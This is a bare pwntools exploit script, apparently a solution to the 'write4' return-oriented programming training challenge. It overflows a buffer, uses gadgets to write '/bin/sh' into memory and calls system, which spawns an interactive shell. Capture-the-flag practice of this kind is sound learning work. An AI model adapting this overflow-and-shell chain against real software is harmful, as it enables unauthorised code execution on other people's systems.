from pwn import *
from os import popen

p = process('./write4')
p.recv()

payload  = b'A' * 40
payload += p64(0x004005b9)          # ret align
payload += p64(0x00400890)          # pop r14; pop r15; ret
payload += p64(0x00601060)          # r14
payload += p64(0x0068732f6e69622f)  # /bin/sh
payload += p64(0x00400820)          # mov [r14], r15; ret
payload += p64(0x00400893)          # pop rdi
payload += p64(0x00601060)          # r14 = /bin/sh
payload += p64(0x004005e0)          # system

p.sendline(payload)
p.interactive()
